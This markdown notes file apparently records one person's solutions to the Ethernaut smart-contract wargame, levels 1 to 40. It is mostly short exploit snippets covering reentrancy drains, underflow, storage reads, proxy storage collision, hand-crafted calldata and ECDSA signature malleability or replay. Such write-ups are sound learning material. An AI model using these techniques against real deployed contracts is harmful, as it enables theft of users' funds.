# console & js snippets

stuff i ran in browser console or hardhat scripts. organized by level.

---

## level 1 - fallback
```js
// contribute tiny amount first
await contract.contribute({value: 1});

// send eth directly to trigger receive()
await contract.sendTransaction({value: 1});

// now we're owner, drain it
await contract.withdraw();
```

---

## level 2 - fallout
```js
// just call the typo'd function
await contract.Fal1out();
```

---

## level 3 - coinflip

deployed CoinFlipAttack contract, then ran this in hardhat:
```js
for (let i = 0; i < 10; i++) {
    await attacker.attack();
    await new Promise(r => setTimeout(r, 15000)); // wait for next block
}
```

**annoying** waiting for blocks but it works.

---

## level 4 - telephone
```js
// call through attack contract
await attackContract.attack(instanceAddress);
```

---

## level 5 - token
```js
// transfer more than we have (20) to cause underflow
await contract.transfer(someOtherAddress, 21);

// check balance - should be huge now
await contract.balanceOf(player);
```

---

## level 6 - delegation
```js
// can use attack contract or just do it directly:
const data = web3.eth.abi.encodeFunctionSignature("pwn()");
await contract.sendTransaction({data: data});
```

---

## level 7 - force
```js
// deploy ForceEth with some value
// it selfdestructs on deploy and sends eth to target
```

---

## level 8 - vault
```js
// read the "private" password from storage
const password = await web3.eth.getStorageAt(contract.address, 1);

// unlock with it
await contract.unlock(password);
```

---

## level 9 - king

deployed KingAttack with value > current prize. done.

---

## level 10 - reentrancy
```js
// deploy attack contract, then:
await attackContract.attack({value: ethers.utils.parseEther("0.001")});
```

watched it drain the contract recursively, pretty cool.

---

## level 11 - elevator
```js
// deploy Building contract, then:
await building.attack();
```

---

## level 12 - privacy
```js
// storage layout:
// slot 0: bool locked, uint256 ID, uint8 denomination (packed)
// slot 1: uint256 awkwardness
// slot 2: uint256 data[0]
// slot 3: uint256 data[1]
// slot 4: uint256 data[2]
// slot 5: uint256 data[3] <- we want this one (index 2)

const data = await web3.eth.getStorageAt(instance, 5);
const key = data.slice(0, 34); // first 16 bytes (bytes16)

await contract.unlock(key);
```

had to look up storage packing rules for this one.

---

## level 13 - gatekeeper one
```js
// deploy attack contract and run it
await attackContract.attack(instanceAddress);
```

the gas brute force takes a few seconds but finds it.

---

## level 14 - gatekeeper two
```js
// just deploy the attack contract
// it completes the level in constructor
```

---

## level 15 - naught coin
```js
// check our balance
const balance = await contract.balanceOf(player);

// approve ourselves
await contract.approve(player, balance);

// transfer using transferFrom
await contract.transferFrom(player, someOtherAddress, balance);
```

---

## level 16 - preservation
```js
// deploy PreservationAttack first
const attackAddr = "0x...";

// first call overwrites library address
await contract.setFirstTime(attackAddr);

// second call runs our malicious setTime
await contract.setFirstTime(1);

// we're owner now
```

---

## level 17 - recovery
```js
// calculate lost contract address
// address = keccak256(rlp([creator, nonce]))[12:]
const creator = "0x..."; // factory address
const nonce = 1; // first contract deployed

const address = ethers.utils.getContractAddress({
    from: creator,
    nonce: nonce
});

// call destroy on it
const abi = ["function destroy(address)"];
const lost = new ethers.Contract(address, abi, signer);
await lost.destroy(player);
```

---

## level 18 - magic number
```js
// runtime bytecode that returns 42:
// 602a    PUSH1 0x2a (42)
// 6000    PUSH1 0x00
// 52      MSTORE
// 6020    PUSH1 0x20
// 6000    PUSH1 0x00
// f3      RETURN

const runtime = "0x602a60005260206000f3";

// creation code to deploy runtime:
const bytecode = "0x69" + runtime.slice(2) + "6000526009601cf3";

// deploy it
await web3.eth.sendTransaction({
    from: player,
    data: bytecode
});
```

**learned way more about opcodes** than i expected.

---

## level 19 - alien codex
```js
// make contact first
await contract.makeContact();

// trigger underflow
await contract.retract();

// calculate which index maps to slot 0
const slot = web3.utils.keccak256(
    web3.eth.abi.encodeParameters(['uint256'], [1])
);
const index = BigInt(2**256) - BigInt(slot);

// overwrite owner at slot 0
const newOwner = '0x' + player.slice(2).padStart(64, '0');
await contract.revise(index.toString(), newOwner);
```

**math was tricky** but basically: codex[i] is at slot keccak256(1) + i, so to hit slot 0 we need i = 2^256 - keccak256(1).

---

## level 20 - denial
```js
// deploy DenialAttack, set it as partner
await contract.setWithdrawPartner(attackAddress);
```

now withdraw() will fail every time.

---

## level 21 - shop
```js
// deploy ShopAttack and run it
await shopAttack.attack();
```

---

## level 22 - dex
```js
// swap back and forth to drain
const token1 = await contract.token1();
const token2 = await contract.token2();

// approve dex
await contract.approve(dexAddress, 1000);

// alternate swaps
await contract.swap(token1, token2, 10);
await contract.swap(token2, token1, 20);
await contract.swap(token1, token2, 24);
await contract.swap(token2, token1, 30);
await contract.swap(token1, token2, 41);
await contract.swap(token2, token1, 45);
```

**amounts get weird** because the formula is broken. eventually drains one pool completely.

---

## level 23 - dex two
```js
// deploy FakeToken
const fake = await FakeToken.deploy();

// send 100 to DEX and 100 to ourselves
await fake.transfer(dexAddress, 100);

// approve
await fake.approve(dexAddress, 300);

// swap fake for real tokens
await contract.swap(fake.address, token1, 100);
await contract.swap(fake.address, token2, 200);
```

drained both pools with my fake token.

---

## level 24 - puzzle wallet
```js
// overwrite owner via storage collision
await contract.proposeNewAdmin(player);

// whitelist ourselves
await contract.addToWhitelist(player);

// deposit once but use multicall to count it twice
const depositData = contract.interface.encodeFunctionData("deposit");
const multicallData = contract.interface.encodeFunctionData("multicall", [[depositData]]);

await contract.multicall([depositData, multicallData], {value: ethers.utils.parseEther("0.001")});

// drain
await contract.execute(player, ethers.utils.parseEther("0.002"), "0x");

// overwrite admin
await contract.setMaxBalance(player);
```

**storage collision proxy trick** is pretty neat.

---

## level 25 - motorbike
```js
// read implementation address from proxy storage
const implSlot = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";
const implAddress = await web3.eth.getStorageAt(proxyAddress, implSlot);

// initialize the implementation directly
const engine = await ethers.getContractAt("Engine", implAddress);
await engine.initialize();

// deploy selfdestruct payload
const attack = await MotorbikeAttack.deploy();

// upgrade to it and call kill
await engine.upgradeToAndCall(attack.address, attack.interface.encodeFunctionData("kill"));
```

---

## level 26 - double entry point
```js
// deploy detection bot
const bot = await DetectionBot.deploy(vaultAddress);

// register with forta
const forta = await ethers.getContractAt("Forta", fortaAddress);
await forta.setDetectionBot(bot.address);
```

---

## level 27 - good samaritan
```js
// deploy and run attack contract
await attackContract.attack();
```

---

## level 28 - gatekeeper three
```js
// deploy attack contract with some value
const attack = await GatekeeperThreeAttack.deploy(instanceAddress, {value: ethers.utils.parseEther("0.001")});

// send more eth to contract so it has > 0.001
await signer.sendTransaction({
    to: instanceAddress,
    value: ethers.utils.parseEther("0.002")
});

// run attack
await attack.attack();
```

---

## level 29 - switch
```js
// craft calldata:
// selector for flipSwitch at offset 0
// offset pointer at 0x04 pointing way past the actual selector
// turnSwitchOff selector somewhere in middle to pass check
// actual flipSwitch data at the pointed offset

const data = "0x30c13ade" + // flipSwitch()
             "0000000000000000000000000000000000000000000000000000000000000060" + // offset = 96
             "0000000000000000000000000000000000000000000000000000000000000000" + // padding
             "20606e1500000000000000000000000000000000000000000000000000000000" + // turnSwitchOff selector (passes check)
             "0000000000000000000000000000000000000000000000000000000000000004" + // length = 4
             "76227e1200000000000000000000000000000000000000000000000000000000"; // flipSwitch selector (actually runs)

await signer.sendTransaction({to: instanceAddress, data: data});
```

**calldata manipulation** is wild. took me a while to get the offsets right.

---

## level 30 - higher order
```js
// registerTreasury takes uint8 but assembly reads full 32 bytes
// send a value > 255
const data = contract.interface.encodeFunctionData("registerTreasury", [256]);
await signer.sendTransaction({to: instanceAddress, data: data});

// now we can claim
await contract.claimLeadership();
```

---

## level 31 - stake
```js
// stake WETH (will fail but contract doesn't check)
await contract.StakeWETH(amount);

// force eth into contract
const forcer = await ForceEth.deploy(instanceAddress, {value: ethers.utils.parseEther("0.001")});

// unstake to 0 but remain in stakers
await contract.Unstake(amount);
```

the return value checks were just not there.

---

## level 32 - impersonator
```js
// get first signature normally
const sig1 = await owner.signMessage(message);
const {r, s, v} = ethers.utils.splitSignature(sig1);

// flip s and v for second valid signature
const n = BigInt("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141");
const sFlipped = n - BigInt(s);
const vFlipped = v === 27 ? 28 : 27;

const sig2 = ethers.utils.joinSignature({
    r: r,
    s: "0x" + sFlipped.toString(16).padStart(64, '0'),
    v: vFlipped
});

// use both
await contract.register(message, sig1);
await contract.claimOwnership(message, sig2);
```

**ecdsa malleability** - never knew about this before ethernaut.

---

## level 33 - magic animal carousel
```js
// create crate with name long enough to overflow
const longName = "A".repeat(200);
await contract.createCrate(longName);
```

name overflows into nextCrateId and breaks everything.

---

## level 34 - bet house
```js
// wrap tokens, move them, withdraw using stale deposit value
// exact steps depend on the contract but basic idea:
await wrappedToken.wrap(amount);
await wrappedToken.transfer(otherAddress, amount);
await betHouse.withdraw(betId); // uses old deposit value
```

---

## level 35 - elliptic token
```js
// craft permit with wrong domain/hash
// exact exploit depends on what's wrong with their implementation
// but basically reuse signatures because hash is broken
```

---

## level 36 - cashback
```js
// abuse delegation to bypass auth
// exact steps vary but involves using delegated calls to mint rewards
```

---

## level 37 - impersonator two
```js
// use owner's signatures in order
const sig1 = // ... first owner signature
const sig2 = // ... second owner signature

await contract.setAdmin(sig1); // uses first sig, increments nonce
await contract.unlock(sig2);   // uses second sig, increments nonce
```

**nonce ordering** was the key. signatures weren't bound to caller.

---

## level 38 - unique nft
```js
// use contract that returns EOA from owner() to bypass tx.origin
// reenter during mint callback
```

---

## level 39 - forger
```js
// get 65-byte signature
const sig65 = await signer.signMessage(message);

// convert to 64-byte EIP-2098 compact form
const {r, s, v} = ethers.utils.splitSignature(sig65);
const vs = v === 28 ? BigInt(s) | (1n << 255n) : BigInt(s);
const sig64 = r + vs.toString(16).padStart(64, '0');

// mint with both
await contract.mint(message, sig65);
await contract.mint(message, "0x" + sig64);
```

same signature, different bytes = bypass replay check.

---

## level 40 - not optimistic portal
```js
// append malicious message as last item (not in hash)
// execute before finalization
```

had to craft the message array carefully so hash skips the last one.

---

**general notes:**
- web3.eth.getStorageAt was super useful for private var levels
- learned a ton about calldata manipulation
- signature stuff (levels 32, 37, 39) was hardest for me
- always check return values on low-level calls!